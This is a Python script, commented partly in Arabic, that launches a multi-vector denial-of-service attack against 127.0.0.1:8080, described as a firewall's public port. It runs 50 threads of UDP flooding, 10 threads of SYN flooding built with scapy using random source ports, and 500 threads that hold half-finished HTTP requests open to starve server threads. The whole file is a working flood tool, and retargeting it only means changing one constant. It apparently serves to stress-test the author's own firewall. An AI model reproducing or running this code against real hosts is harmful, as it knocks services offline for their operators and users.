import socket
import threading
import time
import random
from scapy.all import IP, TCP, send  # رجعنا المكتبة تاني

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080 # We must attack the Firewall's public port

def volumetric_udp_flood():
    """VECTOR 1: Volumetric Attack (Pure Bandwidth Exhaustion)"""
    junk_data = random.randbytes(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(junk_data, (TARGET_IP, TARGET_PORT))
        except: pass

def protocol_syn_flood():
    """VECTOR 2: Protocol Attack (TCP Handshake Exhaustion)"""
    # بيعمل Spoofing لبورتات وهمية وبيبعت طلبات SYN عشان يستهلك الـ TCP Handshake
    while True:
        try:
            spoofed_port = random.randint(1024, 65535)
            ip_layer = IP(src=TARGET_IP, dst=TARGET_IP)
            tcp_layer = TCP(sport=spoofed_port, dport=TARGET_PORT, flags="S")
            send(ip_layer / tcp_layer, verbose=False)
        except: pass

def layer7_thread_exhaustion():
    """VECTOR 3: Application Layer Attack (Thread Exhaustion)"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # بنبعت نص الطلب
            s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n") 
            
            # بننيم المهاجم عشان يفضل ماسك الخط ويعمل Starvation
            while True:
                time.sleep(10)
        except: pass

if __name__ == "__main__":
    print(f"[*] Launching MULTI-VECTOR DDoS Attack against Firewall on {TARGET_IP}:{TARGET_PORT}...")
    
    print("[+] 🚀 Deploying Vector 1: Volumetric UDP Flood...")
    for _ in range(50):
        threading.Thread(target=volumetric_udp_flood, daemon=True).start()
        
    print("[+] 🚀 Deploying Vector 2: Protocol SYN Flood...")
    for _ in range(10): 
        threading.Thread(target=protocol_syn_flood, daemon=True).start()
        
    print("[+] 🚀 Deploying Vector 3: Layer 7 Thread Exhaustion...")
    for _ in range(500):
        threading.Thread(target=layer7_thread_exhaustion, daemon=True).start()

    print("\n[🔥] ALL VECTORS ACTIVE. Server is under massive stress.")
    print("[*] Press Ctrl+C to stop the attack.")

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Attack aborted.")